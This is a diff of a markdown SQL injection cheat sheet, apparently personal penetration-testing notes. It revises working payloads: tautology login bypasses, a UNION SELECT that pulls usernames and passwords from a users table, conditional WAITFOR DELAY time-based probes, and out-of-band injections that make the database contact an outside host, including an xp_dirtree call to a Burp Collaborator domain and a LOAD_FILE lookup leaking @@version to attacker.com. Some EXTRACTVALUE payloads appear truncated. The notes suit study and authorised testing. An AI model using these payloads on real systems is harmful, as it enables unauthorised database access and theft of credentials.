@@ -25,7 +25,7 @@
 ## Retrieving Hidden Data
 
 * Use comments syntax to change the logic (`'—` )
-* Use `' OR 1=1--` , `'+OR+1=1--` <sup><sub>(should end with space character)<sub></sup>
+* Use `' OR 1=1-- //` , `'+OR+1=1-- //` <sup><sub>(should end with space character, forward slashes are used to prevent any whitespace truncation)<sub></sup>
 
 ## Subverting Application Logic
 
@@ -43,7 +43,7 @@
 
 ## Determine the Number of Columns being Displayed using `ORDER BY`
 
-* `'+ORDER+BY+1--` <sup><sub>(keep incremeting the value)<sub></sup>
+* `'+ORDER+BY+1--` <sup><sub>(keep incrementing the value)<sub></sup>
 * `'+UNION+SELECT+NULL,NULL--` <sup><sub>(append more<sub></sup> <sup><sub>`NULL`<sub></sup> <sup><sub>if required)<sub></sup>
 * Reason for using NULL is because it should be compatible with the data types
 
@@ -55,7 +55,7 @@
 ## Retrieving Multiple Values within Single Column
 
 * Retrieve multiple values within this single column by concatenating the values together
-* `'+UNION+SELECT+username+||+'~'+||+password+FROM+users--`
+* `'+UNION+SELECT+username+||+'~'+||+password+FROM+users-- //`
 * eg: oracle database uses `||` for string concatenation -> change accordingly
 
 ## Examining Database Details
@@ -116,8 +116,8 @@
 
 * If error handling mechanism is defined
 * Triggering time delays conditionally, depending on an injected condition
-* `'; IF (1=2) WAITFOR DELAY '0:0:10'--`
-* `'; IF (1=1) WAITFOR DELAY '0:0:10'--` (triggers a delay of 10 seconds)
+* `'; IF (1=2) WAITFOR DELAY '0:0:10'-- //`&#x20;
+* `'; IF (1=1) WAITFOR DELAY '0:0:10'-- //` (triggers a delay of 10 seconds)
 * Time delay function varies depending on DB version
 * In resource pool change max concurrent requests to 1 and in results -> column -> response received/completed -> look for the number matching the time delay
 
@@ -127,9 +127,9 @@
 * Make use of burp collaborator or [interactsh](https://github.com/projectdiscovery/interactsh)
 * Cmd varies according to version of DB
 * If sql query is executed asynchronously -> use this method
-* `'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--`
-* `x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f>+%25remote%3b]>'),'/l')+FROM+dual--`
-* `x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f>+%25remote%3b]>'),'/l')+FROM+dual--`
+* `'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'-- //`
+* `x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f>+%25remote%3b]>'),'/l')+FROM+dual-- //`
+* `x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f>+%25remote%3b]>'),'/l')+FROM+dual-- //`
 * `LOAD_FILE(CONCAT('\\',@@version,'.attacker.com\README.txt'))`
 
 ## Bypass WAF using Hackvertor
